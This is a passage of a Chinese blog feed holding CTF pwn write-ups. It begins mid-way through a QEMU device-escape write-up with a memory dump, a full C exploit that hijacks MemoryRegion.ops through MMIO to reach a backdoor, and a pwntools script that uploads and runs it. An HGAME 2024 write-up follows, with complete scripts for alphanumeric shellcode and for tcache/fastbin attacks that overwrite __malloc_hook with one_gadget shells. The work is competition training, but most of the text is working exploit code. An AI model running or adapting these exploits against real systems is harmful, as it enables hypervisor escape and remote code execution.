class="number">0x55da2812eef8</span>: <span class="number">0x000055da2812e470</span> <span class="number">-23</span> -&gt; test23 -&gt; opaque</span><br><span class="line"><span class="number">0x55da2812ef00</span>: <span class="number">0x000055da271feae0</span> <span class="number">-22</span> -&gt; test22 -&gt; container</span><br><span class="line"><span class="number">0x55da2812ef08</span>: <span class="number">0x0000000000000000</span> <span class="number">-21</span> -&gt; test21 -&gt; 这里不知道是什么😭</span><br><span class="line"><span class="number">0x55da2812ef10</span>: <span class="number">0x0000000000001000</span> <span class="number">-20</span> -&gt; test20 -&gt; size(Int128)</span><br><span class="line"><span class="number">0x55da2812ef18</span>: <span class="number">0x0000000000000000</span> <span class="number">-19</span> -&gt; test19 -&gt; size</span><br><span class="line"><span class="number">0x55da2812ef20</span>: <span class="number">0x00000000febf1000</span> <span class="number">-18</span> -&gt; test18 -&gt; addr</span><br><span class="line"><span class="number">0x55da2812ef28</span>: <span class="number">0x000055da256a335b</span> <span class="number">-17</span> -&gt; test17 -&gt; mr</span><br><span class="line"><span class="number">0x55da2812ef30</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef38</span>: <span class="number">0x0000000000010001</span></span><br><span class="line"><span class="number">0x55da2812ef40</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef48</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef50</span>: <span class="number">0x0000000000000001</span></span><br><span class="line"><span class="number">0x55da2812ef58</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef60</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef68</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef70</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef78</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef80</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef88</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef90</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812ef98</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812efa0</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812efa8</span>: <span class="number">0x0000000000000000</span> -&gt; test0 </span><br><span class="line"><span class="number">0x55da2812efb0</span>: <span class="number">0x0000000000000000</span> -&gt; 可以看到这里有一大片<span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="number">0x55da2812efb8</span>: <span class="number">0x0000000000000000</span> -&gt; 我们可以把控制流劫持的指针</span><br><span class="line"><span class="number">0x55da2812efc0</span>: <span class="number">0x0000000000000000</span> -&gt; 放在这一片</span><br><span class="line"><span class="number">0x55da2812efc8</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812efd0</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812efd8</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812efe0</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55da2812efe8</span>: <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure></p>
<p>我们可以看到这就是 MemoryRegion，当我们修改 ptr[-24 + 720] 即
MemoryRegion.ops 的值为 0x55da2812efb8(&amp;test0 + 8)，我们就可以在执行
vn_mmio_read 和 vn_mmio_write 时去执行 0x55da2812efb8 指向的函数</p>
<p>所以我们考虑这样的布置： <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x55da2812eef0</span>(&amp;test24)   -&gt; <span class="number">0x55da2812efd8</span></span><br><span class="line"><span class="number">0x55da2812efd8</span>(&amp;backdoor) -&gt; <span class="number">0x55da2812efd0</span> -&gt; 后门函数<span class="number">0x67429B</span></span><br></pre></td></tr></table></figure></p>
<p>完整 exp <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;termios.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// #define MAP_SIZE 4096UL</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAP_SIZE 0x1000000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAP_MASK (MAP_SIZE - 1)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* pci_device_name = <span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* mmio_base;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* <span class="title function_">getMMIOBase</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="keyword">if</span>((fd = open(pci_device_name, O_RDWR | O_SYNC)) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open pci device&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    mmio_base = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, fd,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(mmio_base == (<span class="type">void</span> *) <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> mmio_base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">uint64_t</span> addr, <span class="type">uint64_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">    *((<span class="type">uint64_t</span>*)(mmio_base + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">uint64_t</span> addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="type">uint32_t</span>*)(mmio_base + addr));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write_idx</span><span class="params">(<span class="type">uint64_t</span> idx, <span class="type">uint64_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint64_t</span> val = value + (idx &lt;&lt; <span class="number">32</span>);</span><br><span class="line">    mmio_write(<span class="number">0x20</span>,val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> catflag_addr = <span class="number">0x6E65F9</span>;</span><br><span class="line"></span><br><span class="line">    getMMIOBase();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmio_base Resource0Base: %p\n&quot;</span>, mmio_base);</span><br><span class="line">    </span><br><span class="line">    mmio_write(<span class="number">0x10</span>, <span class="number">-17</span>*<span class="number">0x8</span>);</span><br><span class="line">    <span class="type">uint64_t</span> pie_low = mmio_read(<span class="number">0x20</span>);</span><br><span class="line">    mmio_write(<span class="number">0x10</span>, <span class="number">-17</span>*<span class="number">0x8</span> + <span class="number">0x4</span>);</span><br><span class="line">    <span class="type">uint64_t</span> pie_high = mmio_read(<span class="number">0x20</span>);</span><br><span class="line">    <span class="type">uint64_t</span> pie = pie_low + (pie_high &lt;&lt; <span class="number">32</span>) - <span class="number">0x82B35B</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pie = 0x%llx\n&quot;</span>, pie);</span><br><span class="line">    getchar();</span><br><span class="line">    mmio_write(<span class="number">0x10</span>, <span class="number">-10</span>*<span class="number">0x8</span>);</span><br><span class="line">    <span class="type">uint64_t</span> heap_low = mmio_read(<span class="number">0x20</span>);</span><br><span class="line">    mmio_write(<span class="number">0x10</span>, <span class="number">-10</span>*<span class="number">0x8</span> + <span class="number">0x4</span>);</span><br><span class="line">    <span class="type">uint64_t</span> heap_high = mmio_read(<span class="number">0x20</span>);</span><br><span class="line">    <span class="type">uint64_t</span> heap = heap_low + (heap_high &lt;&lt; <span class="number">32</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;heap = 0x%llx\n&quot;</span>, heap);</span><br><span class="line">    <span class="type">uint64_t</span> backdoor = pie + <span class="number">0x67429B</span>;</span><br><span class="line">    <span class="type">uint64_t</span> system_plt_addr = heap + <span class="number">0x60</span> + <span class="number">8</span>;</span><br><span class="line">    <span class="type">uint64_t</span> cmdaddr = heap + <span class="number">0x58</span> + <span class="number">8</span>;</span><br><span class="line">    getchar();</span><br><span class="line">    mmio_write_idx(<span class="number">8</span>,<span class="number">0x20746163</span>);</span><br><span class="line">    mmio_write_idx(<span class="number">12</span>,<span class="number">0x67616C66</span>);</span><br><span class="line">    mmio_write_idx(<span class="number">16</span>,backdoor &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">    mmio_write_idx(<span class="number">20</span>,backdoor &gt;&gt; <span class="number">32</span>);</span><br><span class="line">    mmio_write_idx(<span class="number">24</span>,system_plt_addr &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">    mmio_write_idx(<span class="number">28</span>,system_plt_addr &gt;&gt; <span class="number">32</span>);</span><br><span class="line">    mmio_write_idx(<span class="number">32</span>,cmdaddr &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">    mmio_write_idx(<span class="number">36</span>,cmdaddr &gt;&gt; <span class="number">32</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">40</span>;i &lt;= <span class="number">60</span> ;i += <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        mmio_write_idx(i,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    getchar();</span><br><span class="line">    mmio_write(<span class="number">0x10</span>,<span class="number">-0xc0</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    mmio_write(<span class="number">0x30</span>,system_plt_addr);</span><br><span class="line">    getchar();</span><br><span class="line">    mmio_read(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>如何传到远端服务器？</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># exp.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time, os</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">9999</span>)</span><br><span class="line">os.system(<span class="string">&quot;tar -czvf exp.tar.gz ./exp&quot;</span>)</span><br><span class="line">os.system(<span class="string">&quot;base64 exp.tar.gz &gt; b64_exp&quot;</span>)</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;./b64_exp&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline()</span><br><span class="line">p.recvuntil(<span class="string">&quot;~ #&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;echo &#x27;&#x27; &gt; b64_exp;&quot;</span>)</span><br><span class="line"></span><br><span class="line">count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;now line: &#x27;</span> + <span class="built_in">str</span>(count))</span><br><span class="line">    line = f.readline().replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(line)&lt;=<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    cmd = <span class="string">b&quot;echo &#x27;&quot;</span> + line.encode() + <span class="string">b&quot;&#x27; &gt;&gt; b64_exp;&quot;</span></span><br><span class="line">    p.sendline(cmd) <span class="comment"># send lines</span></span><br><span class="line">    <span class="comment">#time.sleep(0.02)</span></span><br><span class="line">    <span class="comment">#p.recv()</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;~ #&quot;</span>)</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;base64 -d b64_exp &gt; exp.tar.gz;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;tar -xzvf exp.tar.gz&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;chmod +x ./exp;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;./exp&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>competition</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>comp - 2024hgame-wp</title>
    <url>/posts/11137.html</url>
    <content><![CDATA[<blockquote class="blockquote-center">
谁除夕和情人节还在加班写 wp 啊😭2024要脱离 game 级别！
</blockquote>
<span id="more"></span>
<h1 id="目录">目录</h1>
<ul>
<li><a href="#week1">Week 1</a>
<ul>
<li><a href="#pwn">Pwn</a></li>
</ul></li>
<li><a href="#week2">Week 2</a>
<ul>
<li><a href="#pwn---ak">Pwn</a></li>
<li><a href="#rev">Rev</a></li>
</ul></li>
<li><a href="#week3">Week3</a>
<ul>
<li><a href="#pwn---一血">Pwn</a></li>
</ul></li>
<li><a href="#week4">Week4</a>
<ul>
<li><a href="#pwn-1">Pwn</a></li>
</ul></li>
</ul>
<h1 id="week1">Week1</h1>
<p>week1 在做项目，把这事给忘了，做 week2 的时候为了找灵感做了一下 week1
的 ezshellcode</p>
<h2 id="pwn">Pwn</h2>
<h3 id="ezshellcode">ezshellcode</h3>
<p>alphanumeric shellcode <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ae64 import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">ip = &#x27;106.14.57.14:30657&#x27;.split(&#x27;:&#x27;)</span><br><span class="line">file = &#x27;./vuln&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(ip[0],int(ip[1]))</span><br><span class="line"># io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./vuln&#x27;)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">io.sendlineafter(&#x27;input the length of your shellcode:&#x27;,str(-1))</span><br><span class="line"></span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">payload = AE64().encode(payload,&#x27;rax&#x27;,0,&#x27;small&#x27;)</span><br><span class="line">print(payload.decode(&#x27;latin-1&#x27;))</span><br><span class="line">io.sendafter(&#x27;input your shellcode:&#x27;,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
<h1 id="week2">Week2</h1>
<h2 id="pwn---ak">Pwn - AK</h2>
<h3 id="fastnote">fastnote</h3>
<p>libc-2.31，填满 tcachebin 的 unsortedbin leak + fastbin attack
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">ip = &#x27;47.102.130.35:31898&#x27;.split(&#x27;:&#x27;)</span><br><span class="line">file = &#x27;./vuln&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(ip[0],int(ip[1]))</span><br><span class="line"># io = process(file)</span><br><span class="line"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./vuln&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc-2.31.so&#x27;)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(Index,size,content):</span><br><span class="line">  io.sendlineafter(&#x27;Your choice:&#x27;, str(1))</span><br><span class="line">  io.sendlineafter(&#x27;Index: &#x27;, str(Index))</span><br><span class="line">  io.sendlineafter(&#x27;Size: &#x27;, str(size))</span><br><span class="line">  io.sendlineafter(&#x27;Content: &#x27;, content)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">def show(Index):</span><br><span class="line">  io.sendlineafter(&#x27;Your choice:&#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;Index: &#x27;, str(Index))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">def free(Index):</span><br><span class="line">  io.sendlineafter(&#x27;Your choice:&#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;Index: &#x27;, str(Index))</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">payload = &#x27;A&#x27;*4</span><br><span class="line">for i in range(8):</span><br><span class="line">    alloc(i,0x80,payload) # chunk0-6 tcachebin, chunk7: unsortedbin</span><br><span class="line"></span><br><span class="line">alloc(8,0x10,payload) # 防annex</span><br><span class="line"></span><br><span class="line">for i in range(8):</span><br><span class="line">   free(i)</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    alloc(i,0x80,payload) # chunk0-6 tcachebin</span><br><span class="line"></span><br><span class="line">payload = &#x27;A&#x27;*7</span><br><span class="line">alloc(7,0x08,payload) # 因为 read 函数貌似会把 chunk 内部用 &#x27;\x00&#x27; 填满，所以只申请0x08，可以留下 bk 里的信息</span><br><span class="line"></span><br><span class="line">show(7)</span><br><span class="line">main_arena = u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;)) - 0x80 - 0x60</span><br><span class="line">main_arena_offset = libc.sym[&quot;__malloc_hook&quot;] + 0x10</span><br><span class="line">libc_base = main_arena - main_arena_offset</span><br><span class="line">print(&quot;main_arena   ---&gt;   &quot;,hex(main_arena))</span><br><span class="line">print(&quot;main_arena_offset   ---&gt;   &quot;,hex(main_arena_offset))</span><br><span class="line">print(&quot;libc_base    ---&gt;   &quot;,hex(libc_base))</span><br><span class="line"></span><br><span class="line">alloc(0,0x60,payload) # 申请 unsortedbin 里面的 chunk，便于后面 alloc</span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line">payload = &#x27;a&#x27;*8</span><br><span class="line">for i in range(9):</span><br><span class="line">  alloc(i,0x10,payload) # chunk0-6:&quot;7 tcachebin chunks&quot;  || chunk7,8:&quot;fastbin chunk&quot;</span><br><span class="line"></span><br><span class="line">for i in range(9):</span><br><span class="line">  free(i) # free(0-6) free(7,8)</span><br><span class="line"></span><br><span class="line">free(7)</span><br><span class="line"></span><br><span class="line"># gdb.attach(io) # state1</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">  alloc(i,0x10,payload) # chunk0-6: 清空tcachebin</span><br><span class="line"></span><br><span class="line">malloc_addr = libc_base + libc.sym[&#x27;__malloc_hook&#x27;]</span><br><span class="line">print(&quot;malloc_addr    ---&gt;   &quot;,hex(malloc_addr))</span><br><span class="line">payload = p64(malloc_addr)</span><br><span class="line">alloc(7,0x10,payload) # chunk7: 劫持由fastbin生成的tcachebin链</span><br><span class="line">io.sendlineafter(&#x27;Your choice:&#x27;, str(1))</span><br><span class="line">io.sendlineafter(&#x27;Index: &#x27;, str(7))</span><br><span class="line">io.sendlineafter(&#x27;Size: &#x27;, str(0x10))</span><br><span class="line">io.sendafter(&#x27;Content: &#x27;, payload)</span><br><span class="line"></span><br><span class="line">alloc(8,0x10,payload) # chunk8: chunk8</span><br><span class="line">one_gadget = [0xe3afe, 0xe3b01, 0xe3b04]</span><br><span class="line">payload = p64(libc_base + one_gadget[1])</span><br><span class="line">alloc(9,0x10,payload) # chunk9: Any Address</span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line"># alloc(10,0x10,payload) # getshell</span><br><span class="line">io.sendlineafter(&#x27;Your choice:&#x27;, str(1))</span><br><span class="line">io.sendlineafter(&#x27;Index: &#x27;, str(10))</span><br><span class="line">io.sendlineafter(&#x27;Size: &#x27;, str(0x10))</span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [r12] == NULL || r12 == NULL</span><br><span class="line"></span><br><span class="line">0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br><span class="line"></span><br><span class="line">0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == NULL || rsi == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure></p>
<h3 id="old_fastnote">old_fastnote</h3>
<p>libc-2.23，unsortedbin leak + fastbin attack，注意 fastbin chunk 的
size 域构造</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">ip = &#x27;106.14.57.14:32449&#x27;.split(&#x27;:&#x27;)</span><br><span class="line">file = &#x27;./vuln&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(ip[0],int(ip[1]))</span><br><span class="line"># io = process(file)</span><br><span class="line"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./vuln&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc-2.23.so&#x27;)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(Index,size,content):</span><br><span class="line">  io.sendlineafter(&#x27;Your choice:&#x27;, str(1))</span><br><span class="line">  io.sendlineafter(&#x27;Index: &#x27;, str(Index))</span><br><span class="line">  io.sendlineafter(&#x27;Size: &#x27;, str(size))</span><br><span class="line">  io.sendlineafter(&#x27;Content: &#x27;, content)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">def show(Index):</span><br><span class="line">  io.sendlineafter(&#x27;Your choice:&#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;Index: &#x27;, str(Index))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">def free(Index):</span><br><span class="line">  io.sendlineafter(&#x27;Your choice:&#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;Index: &#x27;, str(Index))</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">payload = &#x27;A&#x27;*4</span><br><span class="line">for i in range(1):</span><br><span class="line">    alloc(i,0x80,payload) # chunk0: unsortedbin</span><br><span class="line"></span><br><span class="line">alloc(1,0x10,payload) # chunk1 防annex</span><br><span class="line"></span><br><span class="line">for i in range(1):</span><br><span class="line">   free(i)</span><br><span class="line"></span><br><span class="line">payload = &#x27;A&#x27;*7</span><br><span class="line">alloc(0,0x08,payload) # 因为 read 函数貌似会把 chunk 内部用 &#x27;\x00&#x27; 填满，所以只申请0x08，可以留下 bk 里的信息</span><br><span class="line"></span><br><span class="line">show(0)</span><br><span class="line">main_arena = u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;)) - 0x80 - 88</span><br><span class="line">main_arena_offset = libc.sym[&quot;__malloc_hook&quot;] + 0x10</span><br><span class="line">libc_base = main_arena - main_arena_offset</span><br><span class="line">print(&quot;main_arena   ---&gt;   &quot;,hex(main_arena))</span><br><span class="line">print(&quot;main_arena_offset   ---&gt;   &quot;,hex(main_arena_offset))</span><br><span class="line">print(&quot;libc_base    ---&gt;   &quot;,hex(libc_base))</span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line">alloc(0,0x60,payload) # 申请 unsortedbin 里面的 chunk，便于后面 alloc</span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line">payload = &#x27;a&#x27;*8</span><br><span class="line">for i in range(2):</span><br><span class="line">  alloc(i,0x60,payload) # chunk0,1:&quot;fastbin chunk&quot;</span><br><span class="line"></span><br><span class="line">for i in range(2):</span><br><span class="line">  free(i) # free(0,1)</span><br><span class="line"></span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line"># gdb.attach(io) # state1</span><br><span class="line"></span><br><span class="line">malloc_addr = libc_base + libc.sym[&#x27;__malloc_hook&#x27;] - 0xb - 0x18</span><br><span class="line">print(&quot;malloc_addr    ---&gt;   &quot;,hex(malloc_addr))</span><br><span class="line">payload = p64(malloc_addr)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(&#x27;Your choice:&#x27;, str(1))</span><br><span class="line">io.sendlineafter(&#x27;Index: &#x27;, str(7))</span><br><span class="line">io.sendlineafter(&#x27;Size: &#x27;, str(0x60))</span><br><span class="line">io.sendafter(&#x27;Content: &#x27;, payload)</span><br><span class="line"></span><br><span class="line">alloc(8,0x60,payload) # chunk8: chunk8</span><br><span class="line">alloc(9,0x60,payload) # chunk9: Any Address</span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line">one_gadget = [0x45226, 0x4527a, 0xf03a4, 0xf1247]</span><br><span class="line">payload = p64(libc_base + one_gadget[3])</span><br><span class="line">payload = b&#x27;\x00&#x27;*19 + payload</span><br><span class="line">io.sendlineafter(&#x27;Your choice:&#x27;, str(1))</span><br><span class="line">io.sendlineafter(&#x27;Index: &#x27;, str(10))</span><br><span class="line">io.sendlineafter(&#x27;Size: &#x27;, str(0x60))</span><br><span class="line">io.sendafter(&#x27;Content: &#x27;, payload)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(&#x27;Your choice:&#x27;, str(1))</span><br><span class="line">io.sendlineafter(&#x27;Index: &#x27;, str(10))</span><br><span class="line">io.sendlineafter(&#x27;Size: &#x27;, str(0x60))</span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>
<h3 id="eldenring2">eldenRing2</h3>
<p>必须 patch 才能运行 vuln，用给的 libc.so.6 测试出来是 libc-2.31。</p>
<p>做法跟 fastnote 一样，填满 tcachebin 的unsortedbin leak + fastbin
attack</p>
